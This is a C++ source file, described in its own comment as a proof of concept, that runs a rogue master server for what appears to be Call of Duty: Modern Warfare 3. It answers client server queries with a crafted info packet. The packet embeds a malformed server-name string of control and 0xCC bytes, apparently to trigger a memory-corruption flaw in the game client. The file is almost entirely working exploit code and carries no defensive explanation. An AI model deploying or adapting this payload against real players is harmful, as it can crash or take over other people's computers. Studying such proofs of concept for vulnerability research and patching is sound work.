#include "stdafx.hpp"
#include "main.hpp"

#define MW3_SERVER_4CC 0x504F4F4C
#define BUF_SIZE 1024

static SOCKET sock;

bool start_up()
{
	WSADATA wsa_data;
	const auto wsa_result = WSAStartup(MAKEWORD(2, 2), &wsa_data);
	if (wsa_result != 0)
	{
		printf("WSAStartup error: %d\n", wsa_result);
		return false;
	}

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (INVALID_SOCKET == sock)
	{
		printf("Can't initialize socket\n");
		return false;
	}

	sockaddr_in service{};
	service.sin_family = AF_INET;
	service.sin_addr.s_addr = htonl(INADDR_ANY);

//	net_masterServerPort
	service.sin_port = htons(27014);
	const auto result = bind(sock, (SOCKADDR*)&service, sizeof(service));
	if (SOCKET_ERROR == result)
	{
		printf("Can't bind socket\n");
		closesocket(sock);
		return false;
	}


	return true;
}

DWORD WINAPI recv_thread(LPVOID)
{
	auto msg_buf = std::make_unique<char[]>(BUF_SIZE);
	printf("Started thread\n");

	u_long i_mode = 0;
	const auto ioctl_result = ioctlsocket(sock, FIONBIO, &i_mode);
	if (ioctl_result == SOCKET_ERROR)
	{
		printf("ioctlsocket error: %d\n", ioctl_result);
		return 1;
	}

	static sockaddr_in sender{};
	static serverInfo_t info{};

//	simplified step for this POC
	info.serverName_ptr = 0;
	info.rawDataSize = INFO_MAX_DATA;

	while (true)
	{
		int sender_size = sizeof(sender);
		const auto len = recvfrom(sock, msg_buf.get(), BUF_SIZE, 0, (SOCKADDR*)&sender, &sender_size);

		if (len == SOCKET_ERROR)
		{
			return 1;
		}

		if (len == sizeof(serverQuery_t))
		{
			const auto* packet = (serverQuery_t*)msg_buf.get();

			if (packet->magic4CC == MW3_SERVER_4CC)
			{
				printf("Server is sending info to a client\n");
				auto bad_string = "\x5e\x01\xCC\xCC\x0C" "depthprepass"s;
//				auto bad_string = "\x5e\x01\xCC\xCC\x0A" "shellshock"s;
				std::memcpy(&info.rawData[info.serverName_ptr], bad_string.data(), bad_string.length() + 1);
				sendto(sock, (char*)&info, sizeof(serverInfo_t), 0, (SOCKADDR*)&sender, sender_size);
			}
		}

		Sleep(1);
	}

	return 0;
}

int main(int, char**)
{
	if (!start_up())
	{
		return 1;
	}

	DWORD dw_thread_id;
	auto thread = CreateThread(nullptr, 0, recv_thread, nullptr, 0, &dw_thread_id);
	if (thread == nullptr)
	{
		printf("Error in creating thread\n");
		return 1;
	}

	WaitForSingleObject(thread, INFINITE);
	closesocket(sock);
	WSACleanup();

	return 0;
}
